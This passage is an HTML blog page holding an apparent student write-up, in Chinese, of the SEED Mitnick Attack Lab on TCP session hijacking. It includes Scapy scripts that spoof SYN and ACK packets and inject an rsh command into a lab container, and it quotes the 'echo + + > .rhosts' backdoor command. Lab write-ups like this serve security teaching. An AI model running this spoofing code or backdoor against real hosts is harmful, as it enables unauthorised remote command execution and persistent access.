@@ -1,0 +1,698 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Keshanju">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Introduction1994年，Mitnick利用TCP协议中的漏洞和Shimomura的两台计算机之间的信任关系，成功对计算机发起了攻击，这是一种特殊类型的TCP会话劫持。本实验的目的是重现经典的Mitnick攻击，以获得此类攻击的第一手经验。本实验模拟最初在Shimomura的计算机上的设置，然后发动Mitnick攻击，在Shimomura的两台计算机之间创建一个伪造的TCP会话。如果攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Mitnick Attack Lab">
+<meta property="og:url" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/index.html">
+<meta property="og:site_name" content="Keshanju&#39;s Blog">
+<meta property="og:description" content="Introduction1994年，Mitnick利用TCP协议中的漏洞和Shimomura的两台计算机之间的信任关系，成功对计算机发起了攻击，这是一种特殊类型的TCP会话劫持。本实验的目的是重现经典的Mitnick攻击，以获得此类攻击的第一手经验。本实验模拟最初在Shimomura的计算机上的设置，然后发动Mitnick攻击，在Shimomura的两台计算机之间创建一个伪造的TCP会话。如果攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/1.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/2.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/3.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/4.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/5.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/6.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/7.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/8.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/9.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/10.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/11.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/12.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/13.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/14.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/15.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/16.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/17.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/18.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/19.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/20.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/21.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/22.png">
+<meta property="og:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/23.png">
+<meta property="article:published_time" content="2023-05-16T14:56:09.000Z">
+<meta property="article:modified_time" content="2023-05-16T15:09:15.263Z">
+<meta property="article:author" content="Keshanju">
+<meta property="article:tag" content="seed">
+<meta property="article:tag" content="软件安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/05/16/The-Mitnick-Attack-Lab/1.png">
+  
+  
+  
+  <title>The Mitnick Attack Lab - Keshanju&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Keshanju&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="The Mitnick Attack Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-16 22:56" pubdate>
+          2023年5月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          68 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">The Mitnick Attack Lab</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>1994年，Mitnick利用TCP协议中的漏洞和Shimomura的两台计算机之间的信任关系，成功对计算机发起了攻击，这是一种特殊类型的TCP会话劫持。本实验的目的是重现经典的Mitnick攻击，以获得此类攻击的第一手经验。<br>本实验模拟最初在Shimomura的计算机上的设置，然后发动Mitnick攻击，在Shimomura的两台计算机之间创建一个伪造的TCP会话。如果攻击成功了，我们就能在Shimomural的电脑上执行任何命令。</p>
+<h1 id="How-the-Mitnick-Attack-Works"><a href="#How-the-Mitnick-Attack-Works" class="headerlink" title="How the Mitnick Attack Works"></a>How the Mitnick Attack Works</h1><p>Mitnick攻击是TCP会话劫持攻击的一种特例。Mitnick攻击不是劫持受害者A和B之间现有的TCP连接，而是首先代表他们在A和B之间创建一个TCP连接，然后自然地劫持该连接。<br>在实际的米特尼克攻击中，主机A被称为x终端，也就是攻击目标。米特尼克想登录x终端并在上面运行他的命令。主机B是一个受信任的服务器，允许它不需要密码就可以登录X-Terminal。为了登录X-Terminal, Mitnick必须模拟可信服务器，所以他不需要提供任何密码。<br>     <img src="/2023/05/16/The-Mitnick-Attack-Lab/1.png" srcset="/img/loading.gif" lazyload><br>这种攻击共四个步骤：</p>
+<ol>
+<li><strong>序列号预测。</strong>在攻击之前，Mitnick需要了解X-terminal上的初始序列号(ISN)的模式(在那个年代，ISN不是随机的)。Mitnick向X-terminal发送SYN请求，收到SYN+ACK响应，然后向X-terminal发送RESET包，从X-terminal的队列中清除半开连接(防止队列被填满)。重复了二十次之后。他发现两个连续的TCP ISN之间存在一种模式。这使得米特尼克能够预测ISN，这对攻击至关重要。</li>
+<li><strong>SYN flood攻击可信服务器。</strong>为了从可信服务器向X-Terminal发送连接请求，Mitnick需要从可信服务器向X-Terminal发送SYN包。X-Terminal将响应一个SYN+ACK包，该包被发送到受信任的服务器。由于受信任的服务器实际上并没有发起请求，所以它会向X-Terminal发送一个RESET包，要求X-Terminal停止3次握手。这种行为给米特尼克的袭击带来了麻烦。</li>
+</ol>
+<p>为了解决这个问题。米特尼克不得不关闭可信服务器。因此，在欺骗之前，Mitnick对服务器发起了SYN泛洪攻击。那时，操作系统更容易受到SYN泛洪攻击。攻击实际上可以关闭受信任的计算机，使其完全沉默。</p>
+<ol start="3">
+<li><strong>欺骗TCP连接。</strong>Mitnick想使用rsh(远程shell)在X-Terminal上运行一个后门命令;一旦设置了后门，他就可以登录X-Terminal。要在X-Terminal上运行远程shell, Mitnick需要通过身份验证，即他需要在X-Terminal上拥有一个有效的帐户并知道其密码。</li>
+</ol>
+<p>Shimomura经常需要从可信服务器登录到X-Terminal。为了避免每次都输入密码，他在X-Terminal的.rhosts文件中添加了一些信息，这样当他从受信任的服务器登录到X-Terminal时，就不会被要求输入密码。米特尼克想利用这种相互信任的关系。他需要在可信服务器和X-Terminal之间创建一个TCP连接，然后在这个连接中运行rsh。他首先向X-Terminal发送一个SYN请求，使用可信服务器的IP作为源IP地址。然后X-Terminal向服务器发送SYN+ACK响应。由于服务器已经关闭，它不会发送RESET来关闭连接。<br>为了完成三次握手协议，Mitnick需要欺骗一个ACK数据包，该数据包必须确认X-Terminal的SYN+ACK数据包中的序列号。不幸的是，SYN+ACK响应只发送给受信任的服务器，而没有发送给Mitnick，他看不到序列号。然而，由于先前的调查，Mitnick能够预测这个数字是什么，因此他能够成功地欺骗发送给X-Terminal的ACK响应，以完成TCP三次握手。</p>
+<ol start="4">
+<li><strong>运行远程shell。</strong>使用可信服务器和X-Terminal之间建立的TCP连接，Mitnick可以向X-Terminal发送远程shell请求，要求它运行命令。使用这个命令，Mitnick想在X-Terminal上创建一个后门，这样他就可以随时在X-Terminal上获得shell，而不必重复攻击。</li>
+</ol>
+<p>他所需要做的就是在X-Terminal的.rhosts文件中添加“+ +”。他可以通过在X-Terminal上使用rsh执行以下命令来实现:”echo + + &gt; .rhosts”。由于rsh和rlogin程序使用.rhosts文件进行身份验证，因此X-Terminal将信任来自任何人的每个rsh和rlogin请求。</p>
+<h1 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h1><p>在本实验中，我们需要三台机器，一台用于X-Terminal，一台用于可信服务器，另一台用于攻击者。在真正的Mitnick攻击中，攻击者是一台远程机器。在本实验中，为了简单起见，我们将这三台机器放在同一个网络上。<br>进入实验目录，进入Labsetup文件夹，使用<code>docker-compose build</code>构建docker映像，然后使用<code>docker-compose up</code>启动容器。即可看到三个虚拟机在运行。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/2.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/3.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>rsh服务器程序使用两个文件进行身份验证: .rhosts和&#x2F;etc&#x2F;hosts.equiv。每次服务器接收到远程命令请求时，它都会检查&#x2F;etc&#x2F;hosts.equiv。如果请求来自存储在文件中的主机名，服务器将接受它而不要求输入密码。如果&#x2F;etc&#x2F;hosts.Equiv不存在或没有该主机名，RSH将检查用户主目录上的.rhosts文件。<br>Shimomura经常需要从可信服务器在X-Terminal上运行远程命令。为了避免输入密码，他在X-Terminal主机上创建了一个.rhosts文件，并将可信服务器的IP地址放入该文件中。注意，.rhosts文件必须位于用户主目录的顶层，并且只能由所有者&#x2F;用户写入。<br>在本实验中，我们要先在X-Terminal上使用以下命令来设置.rhosts文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">su seed 						➙Switch to the seed account</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 									➙Go to seed’s home directory</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> .rhosts 			➙Create an empty file</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> 10.9.0.6 &gt; .rhosts</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 644 .rhosts</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2023/05/16/The-Mitnick-Attack-Lab/4.png" srcset="/img/loading.gif" lazyload><br>为了验证配置，我们可以在受信任的服务器上运行以下命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">su seed 						➙Switch to the seed account</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">rsh 10.9.0.5 <span class="hljs-built_in">date</span></span><br></code></pre></td></tr></table></figure>
+<p><img src="/2023/05/16/The-Mitnick-Attack-Lab/5.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-1-Simulated-SYN-flooding"><a href="#Task-1-Simulated-SYN-flooding" class="headerlink" title="Task 1: Simulated SYN flooding"></a>Task 1: Simulated SYN flooding</h1><p>Mitnick攻击时的操作系统很容易受到SYN泛洪攻击，这种攻击可以使目标机器静音，甚至关闭它。虽然SYN泛洪攻击已经不会对现代操作系统造成这样的损害，但是我们可以模拟这种效果。<br>我们可以手动停止受信任的服务器容器，但这还不够。当X-Terminal接收到来自受信任服务器的SYN报文时，将返回SYN+ACK报文。在发送此报文之前，需要知道受信任服务器的MAC地址。首先检查ARP缓存。如果没有可信服务器的表项，X-Terminal将发送ARP请求报文请求MAC地址。由于受信任的服务器已经静音，没有人会回应ARP请求，因此X-Terminal无法发出响应。导致TCP连接无法建立。<br>在实际攻击中，可信服务器的MAC地址实际上在X-Terminal的ARP缓存中。即使不是，在使受信任的服务器静默之前，我们也可以简单地欺骗X-Terminal一个来自受信任服务器的ICMP回显请求，这将触发X-Terminal回复可信服务器，从而获得可信服务器的MAC地址，并将其保存到缓存中。<br>为了简化任务，在停止受信任的服务器之前，我们只需从X-Terminal ping它一次，然后使用arp命令检查并确保MAC地址在缓存中。为了达成攻击，我们在X-terminal上运行以下命令，永久地向ARP缓存中添加一个条目(需要在root帐户下运行):</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">arp -s [Server’s IP] [Server’s MAC]</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2023/05/16/The-Mitnick-Attack-Lab/6.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop 39<br></code></pre></td></tr></table></figure>
+<p><img src="/2023/05/16/The-Mitnick-Attack-Lab/7.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-2-Spoof-TCP-Connections-and-rsh-Sessions"><a href="#Task-2-Spoof-TCP-Connections-and-rsh-Sessions" class="headerlink" title="Task 2: Spoof TCP Connections and rsh Sessions"></a>Task 2: Spoof TCP Connections and rsh Sessions</h1><p>现在我们已经“关闭”了受信任的服务器，我们可以模拟受信任的服务器，并尝试使用X-Terminal启动一个rsh会话。由于rsh运行在TCP之上，我们首先需要在可信服务器和X-Terminal之间建立一个TCP连接，然后在这个TCP连接中运行rsh。<br>Mitnick攻击的难点之一是TCP序列号的预测。在TCP序列号不是随机化的时候，这是可能的。然而，现代操作系统现在将其TCP序列号随机化(作为对抗TCP会话劫持攻击的对策)，因此预测数字变得不可行。为了模拟原始Mitnick攻击的情况，我们可以使用Wireshark嗅探数据包，这样我们就可以获得序列号，而不是猜测它们。<br><strong>限制</strong>。为了尽可能接近地模拟原始Mitnick攻击，我们只能使用捕获数据包的以下字段：<code>TCP序列号字段</code>、<code>TCP标志字段</code>、<code>所有长度字段</code>。<br>要在可信服务器和X-Terminal之间创建一个欺骗的rsh会话，我们需要了解rsh的行为。我们启动一个从可信服务器到X-Terminal的rsh会话，然后使用Wireshark捕获它们之间的数据包。我们使用以下命令通过rsh远程shell在主机A上运行date命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">rsh 10.9.0.5 <span class="hljs-built_in">date</span>          //on trusted server</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2023/05/16/The-Mitnick-Attack-Lab/8.png" srcset="/img/loading.gif" lazyload><br>我们可以观察到，一个rsh会话由两个TCP连接组成。第一个连接是由主机A(客户端)发起的。主机B上的rshd进程正在端口514上侦听连接请求。报文1 ~ 3为三次握手协议。第二个连接用于发送错误消息。报文6 ~ 8为第二次连接的三次握手协议。<br>我们将攻击任务分为两个子任务，每个子任务关注一个连接。</p>
+<h2 id="Task-2-1-Spoof-the-First-TCP-Connection"><a href="#Task-2-1-Spoof-the-First-TCP-Connection" class="headerlink" title="Task 2.1: Spoof the First TCP Connection"></a>Task 2.1: Spoof the First TCP Connection</h2><p>第一个TCP连接是由攻击者通过欺骗的SYN包发起的。在X-Terminal接收到SYN包后，它将依次向受信任的服务器发送SYN+ACK包。因为服务器已经关闭，所以它不会重置连接。位于同一网络上的攻击者可以嗅探数据包并获得序列号。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/9.png" srcset="/img/loading.gif" lazyload alt="The First Connection"></p>
+<ol>
+<li><p><strong>欺骗SYN报文。</strong>我们要编写一个程序，假装信任的服务器发送欺骗SYN包到X-Terminal。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>)<br>tcp.flags = <span class="hljs-string">&quot;S&quot;</span><br>ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>p = ip / tcp<br><span class="hljs-keyword">if</span> tcp.flags == <span class="hljs-string">&quot;S&quot;</span>:<br>    send(p)<br></code></pre></td></tr></table></figure>
+<p>需要注意的是，SYN报文的源端口必须为1023端口。如果使用不同的端口，rsh会在连接建立后重置连接。运行代码，伪装server向X-Terminal发出SYN，在Wireshark中，我们可以看到一个SYN+ACK包从X-Terminal发出：<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/10.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/11.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p><strong>响应SYN+ACK报文</strong>。X-Terminal发送SYN+ACK报文后，受信任服务器需要再次发送ACK报文，完成三次握手协议。报文中的确认号为S+1，其中S为SYN+ACK报文中包含的序列号。</p>
+</li>
+</ol>
+<p>在实际的Mitnick攻击中，攻击者看不到SYN+ACK报文，因为该报文发送给了受信任的服务器，而不是发送给攻击者。这就是为什么米特尼克不得不猜测序列号的值。在这个实验中，我们通过数据包嗅探来获得序列号。<br>我们需要使用Scapy编写一个嗅探和欺骗程序，并在攻击者的机器上运行它。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">if</span> pkt[TCP].flags == <span class="hljs-string">&quot;SA&quot;</span> <span class="hljs-keyword">and</span> pkt[IP].src == <span class="hljs-string">&quot;10.9.0.5&quot;</span>:<br>        old_ip = pkt[IP]<br>        old_tcp = pkt[TCP]<br>        tcp_len = old_ip.<span class="hljs-built_in">len</span> - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(old_ip.src, old_tcp.sport,<br>            old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<br><br>        ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>        tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>)<br>        tcp.flags = <span class="hljs-string">&quot;A&quot;</span><br>        tcp.seq = pkt[TCP].ack<br>        tcp.ack = pkt[TCP].seq + <span class="hljs-number">1</span><br>        p = ip / tcp<br>        send(p)<br><br>myFilter = <span class="hljs-string">&#x27;tcp&#x27;</span><br>sniff(iface=<span class="hljs-string">&#x27;br-7db1d5ae22b8&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof) <span class="hljs-comment">#iface从wireshark中查看</span><br></code></pre></td></tr></table></figure>
+<p>注意，在操作过程中，我们需要先启动嗅探程序，再运行step1发送SYN包的程序来触发整个过程。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/12.png" srcset="/img/loading.gif" lazyload><br><img src="/2023/05/16/The-Mitnick-Attack-Lab/13.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="3">
+<li><strong>发送rsh命令</strong>。连接建立后，攻击者需要向X-Terminal发送rsh数据。rsh数据的结构如下所示。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[port number]\x00[uid_client]\x00[uid_server]\x00[your command]\x00<br></code></pre></td></tr></table></figure>
+数据有四个部分:端口号、客户端用户ID、服务器用户ID和命令。端口号将用于第二个连接。我们要修改步骤2中的嗅探和欺骗程序，以便将rsh发送到X-Terminal。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">if</span> pkt[TCP].flags == <span class="hljs-string">&quot;SA&quot;</span> <span class="hljs-keyword">and</span> pkt[IP].src == <span class="hljs-string">&quot;10.9.0.5&quot;</span>:<br>        old_ip = pkt[IP]<br>        old_tcp = pkt[TCP]<br>        tcp_len = old_ip.<span class="hljs-built_in">len</span> - old_ip.ihl*<span class="hljs-number">4</span> - old_tcp.dataofs*<span class="hljs-number">4</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125; -&gt; &#123;&#125;:&#123;&#125; Flags=&#123;&#125; Len=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(old_ip.src, old_tcp.sport,<br>            old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))<br><br>        ip = IP(src=<span class="hljs-string">&quot;10.9.0.6&quot;</span>, dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>        tcp = TCP(sport=<span class="hljs-number">1023</span>, dport=<span class="hljs-number">514</span>)<br>        tcp.flags = <span class="hljs-string">&quot;A&quot;</span><br>        tcp.seq = pkt[TCP].ack<br>        tcp.ack = pkt[TCP].seq + <span class="hljs-number">1</span><br>        data = <span class="hljs-string">&#x27;9090\x00seed\x00seed\x00touch /tmp/xyz\x00&#x27;</span><br>        p = ip / tcp / data<br>        send(p, verbose=<span class="hljs-number">0</span>)<br><br>myFilter = <span class="hljs-string">&#x27;tcp&#x27;</span><br>sniff(iface=<span class="hljs-string">&#x27;br-7db1d5ae22b8&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof)<br></code></pre></td></tr></table></figure>
+运行成功，在wireshark可以看到，X-Terminal上执行了touch命令，启动了一个TCP链接，连接到受信服务器的9090端口，这是我们的rsh数据中指定的端口号。<br><img src="/2023/05/16/The-Mitnick-Attack-Lab/14.png" srcset="/img/loading.gif" lazyload></li>
+</ol>
